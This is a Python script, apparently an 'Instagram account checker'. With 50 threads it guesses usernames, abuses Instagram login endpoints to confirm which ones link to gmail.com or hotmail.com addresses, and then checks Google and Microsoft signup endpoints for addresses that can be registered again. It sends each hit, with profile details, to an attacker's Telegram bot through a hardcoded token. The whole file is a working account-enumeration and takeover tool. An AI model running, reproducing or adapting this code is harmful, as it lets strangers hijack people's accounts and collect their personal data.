from hashlib import md5
from time import time
import requests
from uuid import uuid4
import os
from random import choice, randrange
import sys
from threading import Thread
from user_agent import generate_user_agent
import time as time_module
import urllib.parse

class qredes:
    def __init__(self):
        self.hits = 0
        self.bad_email = 0
        self.bad_instgram = 0
        self.good_insgram = 0
        
        # Hardcoded credentials for Render deployment
        self.token = '7202127091:AAF3XLy98CNDAOI_0X-CneQrhITwHTOamgg'
        self.id = '7746909110'
        
        print('[+] Starting with configured Token and ID...')
        print('[+] Bot will send notifications to Telegram')
        
        # Initialize hotmail tokens
        self.initialize_hotmail()
        
        print('[+] Initialization complete. Starting threads...')
        # Reduced threads for better stability
        for i in range(50):
            Thread(target=self.home, daemon=True).start()
            print(f'[+] Started thread {i+1}/50')
        
        # Keep main thread alive
        try:
            while True:
                time_module.sleep(1)
        except KeyboardInterrupt:
            print('\n[!] Shutting down...')

    def initialize_hotmail(self):
        retry_count = 0
        max_retries = 5
        while retry_count < max_retries:
            try:
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                }
                response = requests.get('https://signup.live.com/signup', headers=headers, timeout=10)
                canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
                self.amsc = response.cookies.get_dict()['amsc']
                
                cookies = {
                    'amsc': self.amsc,
                }
                headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'canary': canary,
                    'content-type': 'application/json; charset=utf-8',
                    'origin': 'https://signup.live.com',
                    'referer': 'https://signup.live.com/',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                }
                json_data = {
                    'clientExperiments': [
                        {
                            'parallax': 'enableplaintextforsignupexperiment',
                            'control': 'enableplaintextforsignupexperiment_control',
                            'treatments': [
                                'enableplaintextforsignupexperiment_treatment',
                            ],
                        },
                    ],
                }
                response = requests.post(
                    'https://signup.live.com/API/EvaluateExperimentAssignments',
                    cookies=cookies,
                    headers=headers,
                    json=json_data,
                    timeout=10
                ).json()
                self.canary = response['apiCanary']
                print('[+] Hotmail tokens initialized successfully')
                break
            except Exception as e:
                retry_count += 1
                print(f'[!] Error getting hotmail tokens (attempt {retry_count}/{max_retries}): {str(e)}')
                time_module.sleep(3)
                if retry_count >= max_retries:
                    print('[!] Failed to initialize hotmail tokens, continuing anyway...')
                    self.amsc = None
                    self.canary = None

    def send_telegram(self, message):
        """Send message to Telegram with retries"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                encoded_message = urllib.parse.quote(message)
                url = f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text={encoded_message}'
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    print('[✓] Message sent to Telegram successfully!')
                    return True
                else:
                    print(f'[!] Telegram API returned status {response.status_code}')
            except Exception as e:
                print(f'[!] Error sending to Telegram (attempt {attempt+1}/{max_retries}): {str(e)}')
                time_module.sleep(2)
        return False

    def insta1(self, email):
        try:
            csrftoken = md5(str(time()).encode()).hexdigest()
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
                'x-csrftoken': csrftoken,
            }
            data = {
                'username': email,
            }
            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', 
                                    headers=headers, data=data, timeout=10).text
            if 'showAccountRecoveryModal' in response or 'user_id' in response:
                return True
            return False
        except Exception as e:
            print(f'[!] insta1 error: {str(e)}')
            return False

    def insta2(self, email):
        try:
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                'Accept': '*/*',
                'Accept-Language': 'en-US',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-Connection-Type': 'WIFI',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            }
            uid = str(uuid4())
            data = {
                'uuid': uid,
                'password': 'ffffdddddaaa666',
                'username': email,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_count': '0'
            }
            re = requests.post(url, headers=headers, data=data, timeout=10).text
            if 'bad_password' in re or 'user_id' in re:
                return True
            return False
        except Exception as e:
            print(f'[!] insta2 error: {str(e)}')
            return False

    def check_gmail(self, email):
        try:
            username = email.split('@')[0] if '@' in email else email
            
            # Simple check using account recovery
            headers = {
                'User-Agent': generate_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            
            # Try checking if email exists
            url = f'https://accounts.google.com/_/lookup/accountlookup?hl=en'
            data = f'identifier={username}%40gmail.com'
            
            response = requests.post(url, headers=headers, data=data, timeout=10)
            
            # If we get certain responses, email likely doesn't exist
            if 'signup' in response.text.lower() or response.status_code == 404:
                return True
            return False
        except Exception as e:
            print(f'[!] check_gmail error: {str(e)}')
            # On error, return False to be safe
            return False

    def check_hotmail(self, email):
        if not self.amsc or not self.canary:
            return False
            
        try:
            cookies = {
                'amsc': self.amsc,
            }
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'canary': self.canary,
                'content-type': 'application/json; charset=utf-8',
                'origin': 'https://signup.live.com',
                'referer': 'https://signup.live.com/',
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            }
            json_data = {
                'signInName': email,
            }
            response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', 
                                    cookies=cookies, headers=headers, json=json_data, timeout=10).text
            if '"isAvailable":true' in response:
                return True
            return False
        except Exception as e:
            print(f'[!] check_hotmail error: {str(e)}')
            return False

    def get_info(self, username, domen):
        try:
            # Try to get Instagram info
            headers = {
                'accept': '*/*',
                'accept-language': 'en',
                'referer': f'https://www.instagram.com/{username}/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
                'x-requested-with': 'XMLHttpRequest',
            }
            params = {
                'username': username,
            }
            
            response = requests.get(
                'https://www.instagram.com/api/v1/users/web_profile_info/',
                params=params,
                headers=headers,
                timeout=10
            ).json()
            
            user_data = response.get('data', {}).get('user', {})
            
            followerNum = user_data.get('edge_followed_by', {}).get('count', 'N/A')
            followingNum = user_data.get('edge_follow', {}).get('count', 'N/A')
            postNum = user_data.get('edge_owner_to_timeline_media', {}).get('count', 'N/A')
            isPraise = user_data.get('is_private', 'N/A')
            full_name = user_data.get('full_name', 'N/A')
            biography = user_data.get('biography', 'N/A')
            id = user_data.get('id', 'N/A')
            
        except Exception as e:
            print(f'[!] get_info error: {str(e)}')
            followerNum = followingNum = postNum = 'N/A'
            isPraise = full_name = biography = id = 'N/A'
        
        info = f'''
🎯 NEW HIT FOUND! 🎯
━━━━━━━━━━━━━━━━
👤 Username: {username}
📧 Email: {username}@{domen}
━━━━━━━━━━━━━━━━
📊 Instagram Stats:
• Followers: {followerNum}
• Following: {followingNum}
• Posts: {postNum}
• Private: {isPraise}
• Full Name: {full_name}
• Bio: {biography}
• ID: {id}
━━━━━━━━━━━━━━━━
by: @armann_olds
'''
        
        print(info)
        
        # Save to file
        try:
            with open('hits.txt', 'a', encoding='utf-8') as f:
                f.write(info + '\n')
        except Exception as e:
            print(f'[!] Error writing to file: {str(e)}')
        
        # Send to Telegram
        self.send_telegram(info)

    def get_username(self):
        try:
            # Generate random Instagram username patterns
            patterns = [
                lambda: f"user{randrange(100000, 999999)}",
                lambda: f"{''.join([chr(randrange(97, 123)) for _ in range(randrange(5, 10))])}",
                lambda: f"{''.join([chr(randrange(97, 123)) for _ in range(3)])}{randrange(1000, 9999)}",
                lambda: f"test{randrange(10000, 99999)}",
                lambda: f"{''.join([chr(randrange(97, 123)) for _ in range(4)])}_{''.join([chr(randrange(97, 123)) for _ in range(4)])}",
            ]
            
            username = choice(patterns)()
            return [username]
            
        except Exception as e:
            print(f'[!] get_username error: {str(e)}')
            return None

    def home(self):
        print(f'[+] Worker thread started')
        while True:
            try:
                # Update status display
                sys.stdout.write(f'\r[Stats] Hits: {self.hits} | Bad IG: {self.bad_instgram} | Bad Email: {self.bad_email} | Good IG: {self.good_insgram}')
                sys.stdout.flush()

                # Get username
                usernames = self.get_username()
                if not usernames:
                    time_module.sleep(1)
                    continue
                
                for username in usernames:
                    # Check both Gmail and Hotmail
                    email1 = f'{username}@gmail.com'
                    email2 = f'{username}@hotmail.com'
                    
                    # Check Gmail
                    try:
                        if self.insta1(email1) or self.insta2(email1):
                            self.good_insgram += 1
                            if self.check_gmail(email1):
                                self.hits += 1
                                print(f'\n[HIT!] Found available: {email1}')
                                self.get_info(username, 'gmail.com')
                            else:
                                self.bad_email += 1
                        else:
                            self.bad_instgram += 1
                    except Exception as e:
                        print(f'\n[!] Error checking {email1}: {str(e)}')
                    
                    # Small delay between checks
                    time_module.sleep(0.5)
                    
                    # Check Hotmail
                    try:
                        if self.insta1(email2) or self.insta2(email2):
                            self.good_insgram += 1
                            if self.check_hotmail(email2):
                                self.hits += 1
                                print(f'\n[HIT!] Found available: {email2}')
                                self.get_info(username, 'hotmail.com')
                            else:
                                self.bad_email += 1
                        else:
                            self.bad_instgram += 1
                    except Exception as e:
                        print(f'\n[!] Error checking {email2}: {str(e)}')
                    
                    # Delay between username checks
                    time_module.sleep(1)
                    
            except Exception as e:
                print(f'\n[!] Worker error: {str(e)}')
                time_module.sleep(5)


if __name__ == '__main__':
    print('='*50)
    print('Instagram Account Checker - Starting...')
    print('='*50)
    qredes()
